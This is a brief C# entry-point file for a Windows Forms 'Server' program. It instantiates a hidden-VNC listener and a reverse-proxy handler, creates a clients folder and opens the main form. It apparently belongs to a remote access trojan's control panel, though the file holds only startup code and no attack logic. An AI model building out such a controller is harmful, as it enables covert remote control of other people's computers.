using System;
using System.IO;
using System.Windows.Forms;
using Server.Forms;
using Server.Handle_Packet;

namespace Server;

internal static class Program
{
	public static FormMain mainform;

	public static HVNCListener hvnc_listner = new HVNCListener();

	public static HandleReverseProxy ReverseProxyHandler = new HandleReverseProxy();

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(defaultValue: false);
		mainform = new FormMain
		{
			Name = "MainForm"
		};
		Directory.CreateDirectory("ClientsFolder");
		Application.Run(mainform);
	}
}
